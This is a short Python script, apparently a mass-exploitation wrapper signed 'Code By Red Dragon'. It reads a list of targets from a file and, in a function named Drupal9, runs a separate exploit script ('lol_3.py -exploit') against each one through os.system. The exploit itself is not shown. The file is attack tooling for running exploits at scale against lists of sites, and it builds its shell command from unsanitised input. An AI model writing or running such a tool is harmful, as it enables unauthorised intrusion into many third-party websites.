# -*- coding: utf-8 -*
from __future__ import unicode_literals
import os, sys, codecs, random               
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time                     
from platform import system 
import warnings
import subprocess
from colorama import init
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
# sys.reload()
# sys.setdefaultencoding('utf8')
init(autoreset=True)
try:
    print ("""Code By Red Dragon """)
    spy = input('List : ')
    with codecs.open(spy, mode='r', encoding='ascii', errors='ignore') as f:
        lists = f.read().splitlines()
except IndexError:
    pass
lists = list((lists))


def Drupal9(l):
    try:        
        if 'wakkkad' in l.content:
            pass
    except:
        pass
def Drupal9(l):
    try:        
        os.system('python3 lol_3.py -exploit ' + l + ' 48 hex 9')
    except:
        pass

def Exploit(l):
    try:
        Drupal9(l)
    except:
        pass


def Main():
    try:
        pp = Pool(1)
        pr = pp.map(Exploit, lists)
    except:
        pass


if __name__ == '__main__':
    Main()
